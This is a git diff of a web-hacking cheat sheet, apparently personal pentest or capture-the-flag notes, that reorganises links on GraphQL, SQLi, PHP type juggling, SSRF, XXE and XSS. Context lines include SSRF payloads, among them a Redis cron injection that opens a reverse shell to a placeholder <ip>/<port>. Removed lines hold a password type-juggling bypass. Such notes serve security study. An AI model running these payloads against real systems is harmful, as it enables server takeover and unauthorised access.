@@ -47,21 +47,22 @@ https://brightsec.com/blog/xss/#xss-types
 https://blog.clever-age.com/fr/2014/02/10/owasp-xss-cross-site-scripting/
 https://excess-xss.com/
 
+### GraphQL
+
+ - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
+ - https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
+ - https://ivangoncharov.github.io/graphql-voyager/
+
 ### SQLi
+  - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
 
-- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
-
-### XXE
-
-- https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
-- https://www.akilischool.com/cours/laravel-creer-un-flux-rss
-- https://gist.github.com/sl4v/7b5e562f110910f85397
+### PHP
+  - `Type Juggling` https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
+  - `Eval` https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/
 
 ### SSRF
-
-- https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
-- https://www.dailysecurity.fr/server-side-request-forgery/
-- https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+  - https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
+  - https://www.dailysecurity.fr/server-side-request-forgery/
 
 ```bash
 file://index.php
@@ -71,21 +72,17 @@ for i in {1..10000}; do curl -s -i http://site.org/index.php --data "url=http://
 dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port> 0>\x261\n\n\n"
 ```
 
-## Bypass filters
+### XXE
+  - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+ 
+--------
 
-[SQLi: énumération via UNION](https://github.com/0x14mth3n1ght/Writeup/blob/master/2022/Star2022/Web/SQL/sql.txt)
-[PHP filters](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
-[PHP: extract() & loose comparison](https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/web/salty)
-[PHP Type juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdfhttps://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+### XSS
+ - https://beta.hackndo.com/attaque-xss/
+ - https://excess-xss.com/
+ - https://learn-cyber.net/article/Self-XSS-Attacks
+ - https://learn-cyber.net/article/Reflected-XSS-Attacks
 
-`Contourner strcmp() (juggling) \ Provoquer une erreur SQL`
-
-- GET: `?password[]=''`
-- POST: `password:[]`
-
-[Bypass Eval](https://github.com/0xchrisb/thesis-non-alphanumeric-code-generator)
-
-[PayloadBox](https://github.com/payloadbox)
 
 `Reflected XSS`
 
